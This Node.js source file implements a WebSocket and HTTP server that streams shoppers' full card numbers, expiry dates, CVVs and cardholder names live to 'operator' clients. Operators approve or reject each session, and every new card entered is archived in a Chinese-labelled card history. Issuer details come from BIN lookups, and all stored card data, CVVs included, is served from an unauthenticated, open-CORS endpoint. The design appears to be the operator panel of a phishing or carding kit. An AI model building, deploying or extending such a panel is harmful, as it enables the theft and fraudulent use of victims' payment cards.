const { WebSocketServer } = require('ws');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = 9529;
const HANDYAPI_KEY = process.env.HANDYAPI_KEY || '';

// === Layer 1: Local CSV BIN database ===
const binMap = new Map();

function loadBinCSV() {
  const csvPath = path.join(__dirname, 'binlist.csv');
  if (!fs.existsSync(csvPath)) {
    console.log('[BIN] No local CSV found, using built-in fallback');
    return;
  }
  const raw = fs.readFileSync(csvPath, 'utf8');
  const lines = raw.split('\n');
  for (let i = 1; i < lines.length; i++) {
    const line = lines[i].trim();
    if (!line) continue;
    const parts = line.split(',').map(s => (s || '').trim().replace(/^"|"$/g, '').replace(/^'|'$/g, ''));
    if (parts.length < 7) continue;
    const bin = parts[0];
    if (!bin || bin.length < 1) continue;
    binMap.set(bin, {
      brand: parts[1],
      type: parts[2],
      issuer: parts[4],
      country: parts[5]
    });
  }
  console.log('[BIN] Local CSV loaded: ' + binMap.size + ' entries');
}

loadBinCSV();

function localLookup(bin) {
  for (let len = 8; len >= 5; len--) {
    const prefix = bin.slice(0, len);
    if (binMap.has(prefix)) return binMap.get(prefix);
  }
  return null;
}

// === Layer 2: Binlist.net (free fallback) ===
function binlistLookup(bin) {
  return new Promise((resolve) => {
    const req = https.get(`https://lookup.binlist.net/${bin}`, (res) => {
      if (res.statusCode !== 200) { res.resume(); return resolve(null); }
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try {
          const j = JSON.parse(data);
          resolve({
            brand: (j.scheme || j.brand || '').toUpperCase(),
            type: (j.type || '').toUpperCase(),
            issuer: (j.bank?.name || '').replace(/^"|"$/g, ''),
            country: j.country?.alpha2 || ''
          });
        } catch { resolve(null); }
      });
    });
    req.setTimeout(4000, () => { req.destroy(); resolve(null); });
    req.on('error', () => resolve(null));
  });
}

// built-in minimum fallback
const MIN_FALLBACK = {
  '4': { brand: 'VISA', type: '', issuer: '', country: '' },
  '5': { brand: 'MASTERCARD', type: '', issuer: '', country: '' },
  '34': { brand: 'AMEX', type: '', issuer: 'AMERICAN EXPRESS', country: 'US' },
  '37': { brand: 'AMEX', type: '', issuer: 'AMERICAN EXPRESS', country: 'US' },
  '6011': { brand: 'DISCOVER', type: '', issuer: 'DISCOVER BANK', country: 'US' },
  '65': { brand: 'DISCOVER', type: '', issuer: '', country: '' },
  '62': { brand: 'UNIONPAY', type: '', issuer: '', country: '' },
};
function minFallback(bin) {
  for (const [p, v] of Object.entries(MIN_FALLBACK)) {
    if (bin.startsWith(p)) return v;
  }
  return { brand: '', type: '', issuer: '', country: '' };
}

// === Combined lookup: Local CSV → Binlist.net → built-in fallback ===
async function binLookup(bin) {
  // Layer 1: local CSV
  const local = localLookup(bin);
  if (local) return local;

  // Layer 2: Binlist.net
  const binlist = await binlistLookup(bin);
  if (binlist) return binlist;

  // Layer 3: built-in fallback
  return minFallback(bin);
}

async function enrichCardInfo(cardInfo) {
  const clean = (cardInfo.cardNumber || '').replace(/\s/g, '');
  if (!clean || clean.length < 6) return cardInfo;
  const info = await binLookup(clean.slice(0, 6));
  if (info.brand) cardInfo.cardType = info.brand;
  if (info.type) cardInfo.cardLevel = info.type;
  if (info.issuer) cardInfo.bankName = info.issuer;
  return cardInfo;
}

const wss = new WebSocketServer({ port: PORT });
const sessions = new Map();
const customerSessions = new Map();
const operators = new Set();
const customers = new Set();
let sessionCounter = 1165;

function broadcast(type, data, sessionId) {
  const msg = JSON.stringify({ type, sessionId: sessionId || undefined, payload: data, timestamp: new Date().toISOString() });
  operators.forEach(ws => { if (ws.readyState === 1) ws.send(msg); });
}

function sendToCustomer(sessionId, data) {
  const session = sessions.get(sessionId);
  if (session?.customerWs && session.customerWs.readyState === 1) {
    session.customerWs.send(JSON.stringify({ type: 'operator_action', payload: data, timestamp: new Date().toISOString() }));
  }
}

function broadcastConnectCount() {
  let opCount = 0;
  operators.forEach(ws => { if (ws._countable !== false) opCount++; });
  broadcast('connect_count', { customerCount: customers.size, operatorCount: opCount });
}

function generateSessionId() { return String(++sessionCounter); }

async function processMessage(msg, ws, cid) {
  switch (msg.type) {
    case 'customer_input': {
      const now = Date.now();
      const counterId = generateSessionId();

      // create session immediately, then enrich with BIN lookup asynchronously
      sessions.set(counterId, {
        ...msg.payload, id: counterId, sessionId: sessionCounter,
        customerWs: ws, status: 'live',
        createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
        isOnline: true, countdownSeconds: 0, createdAtTs: now, pendingTs: 0
      });
      if (cid) customerSessions.set(cid, counterId);

      broadcast('session_new', {
        ...msg.payload, id: counterId, sessionId: sessionCounter,
        status: 'live', createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(), isOnline: true, countdownSeconds: 0, cardHistory: []
      }, counterId);

      sendToCustomer(counterId, { action: 'ack', message: 'session_created', sessionId: counterId });

      // asynchronously enrich card info via BIN API and broadcast update
      enrichCardInfo(msg.payload.cardInfo || {}).then(() => {
        const session = sessions.get(counterId);
        if (session) {
          Object.assign(session.cardInfo, msg.payload.cardInfo);
          broadcast('session_update', { sessionId: counterId, cardInfo: msg.payload.cardInfo }, counterId);
        }
      }).catch(e => {
        console.error('[Payment WS] BIN enrich error:', e);
      });
      break;
    }

    case 'session_update': {
      const { sessionId, ...data } = msg.payload;
      if (!sessionId) break;
      const session = sessions.get(sessionId);
      if (!session) break;

      const prevStatus = session.status;

      if (data.status === 'pending' && prevStatus !== 'pending') {
        // Archive current card to history, skip if cardNumber + expiry + cvv unchanged
        if (!session.cardHistory) session.cardHistory = [];
        const cur = session.cardInfo;
        const lastEntry = session.cardHistory[session.cardHistory.length - 1];
        const same = lastEntry
          && (lastEntry.cardNumber || '').replace(/\s/g, '') === (cur.cardNumber || '').replace(/\s/g, '')
          && (lastEntry.expiry || '') === (cur.expiry || '')
          && (lastEntry.cvv || '') === (cur.cvv || '');
        if (!same) {
          session.cardHistory.push({
            cardNumber: cur.cardNumber || '',
            cardType: cur.cardType || '',
            cardLevel: cur.cardLevel || '',
            bankName: cur.bankName || '',
            expiry: cur.expiry || '',
            cvv: cur.cvv || '',
            cardHolder: cur.cardHolder || ''
          });
        }
        session.pendingTs = Date.now();
        session.countdownSeconds = 120;
      }

      // merge nested objects instead of replacing to avoid UI flicker
      if (data.cardInfo) Object.assign(session.cardInfo, data.cardInfo);
      if (data.customerInfo) Object.assign(session.customerInfo, data.customerInfo);
      if (data.browsingTabs !== undefined) session.browsingTabs = data.browsingTabs;
      if (data.currentStep !== undefined) session.currentStep = data.currentStep;
      if (data.frontendUrl !== undefined) session.frontendUrl = data.frontendUrl;
      if (data.status !== undefined) session.status = data.status;

      session.updatedAt = new Date().toISOString();

      if (data.status === 'pending' && prevStatus !== 'pending') {
        session.pendingTs = Date.now();
        session.countdownSeconds = 120;
      }

      const updatePayload = { sessionId, ...data };
      if (session.cardHistory && session.cardHistory.length > 0) {
        updatePayload.cardHistory = session.cardHistory;
      }

      // always ensure card history tab in browsingTabs if available
      if (session.cardHistory && session.cardHistory.length > 0 && updatePayload.browsingTabs) {
        const idx = updatePayload.browsingTabs.findIndex(t => t.label === '卡片历史');
        const histTab = { label: '卡片历史', count: session.cardHistory.length, active: false };
        if (idx >= 0) {
          updatePayload.browsingTabs[idx] = histTab;
        } else {
          updatePayload.browsingTabs = [...updatePayload.browsingTabs, histTab];
        }
      }
      if (data.status === 'pending' && prevStatus !== 'pending') updatePayload.countdownSeconds = 120;
      broadcast('session_update', updatePayload, sessionId);

      // async BIN enrichment for card updates
      if (data.cardInfo) {
        enrichCardInfo(session.cardInfo).then(() => {
          broadcast('session_update', { sessionId, cardInfo: session.cardInfo }, sessionId);
        });
      }
      break;
    }

    case 'operator_action': {
      const { sessionId, action, message } = msg.payload;
      const session = sessions.get(sessionId);
      if (!session) break;
      session.status = action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : 'processing';
      session.updatedAt = new Date().toISOString();
      broadcast('session_update', { sessionId, status: session.status, action, message }, sessionId);
      sendToCustomer(sessionId, { action, message, sessionId });
      if (action === 'approve' || action === 'reject') {
        setTimeout(() => { sessions.delete(sessionId); broadcast('session_remove', null, sessionId); }, 5000);
      }
      break;
    }

    case 'heartbeat':
      ws.send(JSON.stringify({ type: 'heartbeat', payload: 'pong', timestamp: new Date().toISOString() }));
      break;
  }
}

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, 'http://localhost');
  const role = url.searchParams.get('role');
  const cid = url.searchParams.get('cid');
  const sid = url.searchParams.get('sid');
  const operatorId = url.searchParams.get('operatorId') || 'op_' + Date.now();

    if (role === 'operator') {
    const countable = url.searchParams.get('countable') !== '0';
    ws._countable = countable;
    operators.add(ws);
    broadcastConnectCount();
    ws.send(JSON.stringify({
      type: 'session_list',
      payload: Array.from(sessions.values()).map(s => {
        const { customerWs, ...r } = s;
        const data = { ...r };
        if (r.cardHistory && r.cardHistory.length > 0 && r.browsingTabs) {
          const hasHist = r.browsingTabs.some(t => t.label === '卡片历史');
          if (!hasHist) {
            data.browsingTabs = [...r.browsingTabs, { label: '卡片历史', count: r.cardHistory.length, active: false }];
          }
        }
        return data;
      }),
      timestamp: new Date().toISOString()
    }));
  } else if (role === 'customer') {
    customers.add(ws);
    broadcastConnectCount();
    let reusedSessionId = sid;
    if (!reusedSessionId && cid) reusedSessionId = customerSessions.get(cid);
    if (reusedSessionId && sessions.has(reusedSessionId)) {
      const session = sessions.get(reusedSessionId);
      session.customerWs = ws;
      session.isOnline = true;
      session.updatedAt = new Date().toISOString();
      ws.send(JSON.stringify({ type: 'operator_action', payload: { action: 'session_restored', sessionId: reusedSessionId }, timestamp: new Date().toISOString() }));
      broadcast('session_update', { sessionId: reusedSessionId, isOnline: true }, reusedSessionId);
    }
  }

  ws.on('message', raw => {
    let msg;
    try { msg = JSON.parse(raw.toString()); } catch { return; }
    processMessage(msg, ws, cid);
  });

  ws.on('close', () => {
    if (role === 'operator') { operators.delete(ws); }
    else if (role === 'customer') {
      customers.delete(ws);
      for (const [id, session] of sessions) {
        if (session.customerWs === ws) { session.isOnline = false; session.customerWs = null; broadcast('session_update', { sessionId: id, isOnline: false }, id); }
      }
    }
    broadcastConnectCount();
  });
});

setInterval(() => {
  const now = Date.now();
  sessions.forEach((session, id) => {
    if (session.status !== 'pending' || !session.pendingTs) { session.countdownSeconds = 0; return; }
    const elapsed = Math.floor((now - session.pendingTs) / 1000);
    session.countdownSeconds = Math.max(0, 120 - elapsed);
    if (elapsed % 5 === 0) broadcast('session_update', { sessionId: id, countdownSeconds: session.countdownSeconds }, id);
    if (session.countdownSeconds <= 0) {
      // keep session active, just mark as expired (don't cancel)
      if (session.status === 'pending') {
        broadcast('session_update', { sessionId: id, countdownSeconds: 0, status: 'pending' }, id);
      }
    }
  });
}, 1000);

// === HTTP API for payment data ===
const http = require('http');
const HTTP_PORT = 9530;
http.createServer((req, res) => {
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

  if (req.method === 'GET' && req.url === '/payment/sessions') {
    const list = Array.from(sessions.values()).map(s => {
      const { customerWs, ...rest } = s;
      return { ...rest, cardHistory: s.cardHistory || [] };
    });
    res.writeHead(200);
    res.end(JSON.stringify({ code: '0000', data: list }));
    return;
  }

  res.writeHead(404);
  res.end(JSON.stringify({ code: '1003', data: null }));
}).listen(HTTP_PORT, () => console.log('[Payment HTTP] API running on http://localhost:' + HTTP_PORT));

console.log('[Payment WS] WebSocket server running on ws://localhost:' + PORT);
